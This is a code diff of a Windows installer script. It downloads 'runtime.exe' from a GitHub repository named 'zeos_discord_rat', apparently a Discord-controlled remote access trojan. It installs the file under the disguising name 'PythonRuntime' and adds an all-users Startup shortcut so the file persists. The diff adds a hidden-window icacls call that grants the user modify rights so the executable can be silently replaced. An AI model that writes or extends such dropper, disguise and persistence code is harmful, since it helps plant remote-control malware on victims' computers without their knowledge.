@@ -10,24 +10,25 @@ import urllib.request
 
 import certifi
 
-# ================= CONFIGURATION =================
-
-GITHUB_OWNER = "TaherMustansir1929"
-GITHUB_REPO = "zeos_discord_rat"
-ASSET_NAME = "runtime.exe"
-
-INSTALL_DIR = os.path.join(
-    os.environ.get("ProgramFiles", r"C:\Program Files"), "PythonRuntime"
+from src.constants import (
+    APP_DIR,
+    ASSET_NAME,
+    GITHUB_OWNER,
+    GITHUB_REPO,
+    INSTALL_DIR,
 )
 
-INSTALL_PATH = os.path.join(INSTALL_DIR, "runtime.exe")
+# ================= CONFIGURATION =================
+
+# The runtime is installed in C:\PythonRuntime.
+INSTALL_PATH = INSTALL_DIR / ASSET_NAME
 
 STARTUP_DIR = os.path.join(
     os.environ.get("ProgramData", r"C:\ProgramData"),
     r"Microsoft\Windows\Start Menu\Programs\Startup",
 )
 
-STARTUP_SHORTCUT = os.path.join(STARTUP_DIR, "PythonRuntime.lnk")
+STARTUP_SHORTCUT = os.path.join(STARTUP_DIR, f"{APP_DIR}.lnk")
 
 # Use certifi's trusted certificate bundle for HTTPS.
 SSL_CONTEXT = ssl.create_default_context(cafile=certifi.where())
@@ -109,6 +110,37 @@ def create_startup_shortcut():
     log("Startup shortcut created.")
 
 
+def grant_user_access():
+    """Let the current user replace the executable without elevation.
+
+    The runtime updates itself in the background with the rights of the user
+    that started it, so the install folder has to be writable for them.
+    """
+    username = os.environ.get("USERNAME", "")
+    domain = os.environ.get("USERDOMAIN", "")
+    account = f"{domain}\\{username}" if domain and username else username
+
+    if not account:
+        return
+
+    subprocess.run(
+        [
+            "icacls",
+            str(INSTALL_DIR),
+            "/grant",
+            f"{account}:(OI)(CI)M",
+            "/T",
+            "/Q",
+        ],
+        check=False,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+    )
+
+    log("Access granted to the current user.")
+
+
 def install():
     if os.name != "nt":
         log("ERROR: This installer only supports Windows.")
@@ -119,7 +151,7 @@ def install():
         return False
 
     temporary_path = os.path.join(
-        os.environ.get("TEMP", INSTALL_DIR), "runtime_download.exe"
+        os.environ.get("TEMP", str(INSTALL_DIR)), "runtime_download.exe"
     )
 
     try:
@@ -160,6 +192,9 @@ def install():
         shutil.move(temporary_path, INSTALL_PATH)
 
         log("Installation completed.")
+
+        # The runtime updates itself later without administrator rights.
+        grant_user_access()
 
         create_startup_shortcut()
 
